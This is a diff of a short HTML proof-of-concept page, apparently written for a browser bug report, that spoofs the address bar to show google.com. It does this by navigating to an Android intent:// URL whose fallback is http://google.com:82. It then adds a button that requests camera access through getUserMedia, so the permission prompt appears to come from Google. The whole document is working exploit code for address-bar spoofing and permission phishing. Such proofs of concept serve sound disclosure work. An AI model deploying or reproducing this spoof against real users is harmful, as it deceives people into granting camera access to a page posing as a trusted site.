@@ -1,15 +1,29 @@
 <style>
-button{
+.redirect {
     position: fixed;
-    left: 0;
-    top: 50px;
+    left: 10%;
+    top: 20%;
+}
+
+.permission {
+    position: fixed;
+    left: 10%;
+    top: 30%;
 }
 </style>
 
 <h1>Address bar spoofed This is not Google.com</h1>
 
-<iframe src="https://googlegooglegooglegooglegooglegooglegoo.github.io/iframe" allow="camera"></iframe>
+<button class="redirect" onclick="redirect()">Redirect</button>
+<button class="permission" onclick="permission()">Permission</button>
 
 <script>
-  location.href = "intent://abc#Intent;scheme=https;S.browser_fallback_url=http://google.com:82;end";
+function redirect() {
+    location.href =
+        "intent://abc#Intent;scheme=https;S.browser_fallback_url=http://google.com:82;end";
+}
+
+async function permission() {
+    navigator.mediaDevices.getUserMedia({video:true})
+}
 </script>
